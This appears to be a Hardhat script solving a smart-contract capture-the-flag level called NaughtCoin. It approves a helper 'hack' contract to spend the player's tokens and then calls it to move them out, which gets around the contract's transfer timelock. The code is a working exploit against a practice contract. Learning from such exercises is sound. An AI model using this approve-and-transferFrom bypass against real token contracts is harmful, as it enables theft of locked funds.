// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
    // Gate 2 is damn tricky. After wasting sometime, decided to pick this level later
    const INSTANCE_ADDRESS = '0x38E7A8e6F30B7633AA41f8713536Be41654B531A';
    const HACK_ADDRESS = '0x13DfD88Dfe280925C1C75c6492647739788bdbbB';
    const [owner, addr1] = await ethers.getSigners();

    const NaughtCoin = await hre.ethers.getContractFactory("NaughtCoin");
    const naughtCoin = NaughtCoin.attach(INSTANCE_ADDRESS);
    console.log(await naughtCoin.balanceOf(owner.address));

    const NaughtCoinHack = await hre.ethers.getContractFactory("NaughtCoinHack");
    const naughtCoinHack = NaughtCoinHack.attach(HACK_ADDRESS);
    // const naughtCoinHack = await NaughtCoinHack.deploy();
    // await naughtCoinHack.deployed();

    console.log(`NaughtCoinHack deployed at ${naughtCoinHack.address}`);

    
    let tx = await naughtCoin.approve(naughtCoinHack.address, hre.ethers.utils.parseEther("1000000"));
    console.log(tx);
    await tx.wait();

    tx = await naughtCoinHack.transfer(INSTANCE_ADDRESS);
    console.log(tx)
    await tx.wait();

    console.log(await naughtCoin.balanceOf(owner.address));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
